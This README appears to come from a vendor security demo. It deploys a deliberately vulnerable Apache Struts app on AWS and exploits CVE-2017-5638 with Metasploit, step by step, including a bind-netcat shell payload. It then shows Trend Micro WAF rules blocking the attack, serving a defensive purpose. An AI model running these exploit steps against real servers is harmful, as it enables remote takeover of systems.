## Overview
This demo is created to exploit apache struts with CVE-2017-5638. It will deploy vulnerable struts version with sample demo application on AWS.
Demo is created for 3 AWS regions (Ohio, Oregon, Ireland) with default Ohio region setup. AMI images used in Demo is available in these 3 regions as public AMIs.
In order to setup the environment few hardcoded modifications need to be done on terraform code.

 
## Pre-requisites:
- AWS IAM account with administrator access
- Terraform need to be deployed on user's system with basic configuration
- Metasploit with latest msfupdate in attacker machine.
- if you are setting uo victim outside AWS then you can use following blog post for victim setup.
  http://blog.ud64.com/2017/09/apache-struts-with-cve-2017-5638-set-up.html

NOTE: if in case tomcat service is not started. you can login to EC2 instance and start the same using "#sudo $CATALINA_HOME/bin/startup.sh"

## Hardcoded modifications
- user_data.sh is a bootstrap script which can be modify to add Trend Micro DS agent configuration  
- EC2 Keys are stored in /Scripts directory. you can use the .pem or .ppk to login to EC2 instance over the internet.

## Generic steps for victim setup:
### 1
Deploy terraform template on AWS using terraform plan and terraform apply.
  terraform init
  terraform apply

### 2
Victim domain name will be available in terraform apply output. we have to use the same during our attack 
We have configured proxy with ELB to convert port 8080 to 80.  

### 3
Application URL is configured as struts2_2.3.15.1-showcase/showcase.action

### 4
We can use generic payload for the demo.

set PAYLOAD cmd/unix/generic
set CMD "touch /tmp/hackedsystemexec64"
set PAYLOAD cmd/unix/bind_netcat


### Exploit demo execution steps:
####Step 1:Open metasploit in attacker system 

####step 2: search for the CVE-2017-5638
msf>search CVE-2017-5638

####step 3: use the exploit
msf> use exploit/multi/http/struts2_content_type_ognl

####step 4: configure the application paramenter in exploit options
msf exploit> show options
msf exploit> set RHOST <Domain name of cloudfront> 
msf exploit> set RPORT 80
msf exploit> set TARGETURI struts2_2.3.15.1-showcase/showcase.action
msf exploit> show options


####step 5: configure payload
msf exploit> set PAYLOAD cmd/unix/generic
msf exploit> show payload
msf exploit> set CMD "touch /tmp/hackedsystemexec64"
msf exploit> exploit

Also taking over the system can be possible
msf exploit> set PAYLOAD cmd/unix/bind_netcat
msf exploit> exploit

cmd> id
cmd> whoami


####step 6: SSH to public ip of victim server and show the affected file



Complete!!!.. now show the protection with Deep security and/or Trend Micro managed WAF rules. 

---------------------------Protection with Trendmicro managed WAF rules or with DS---------

NOW, Login to AWS WAF portal and click on Web ACLs 
-> select Trendmicro-Managed-Rule-ACL
-> select rules tab in right side
-> edit ACL and select Trendmicro managed WAF rule (Apache and Ngnix)
-> now run the exploit again. it should fail
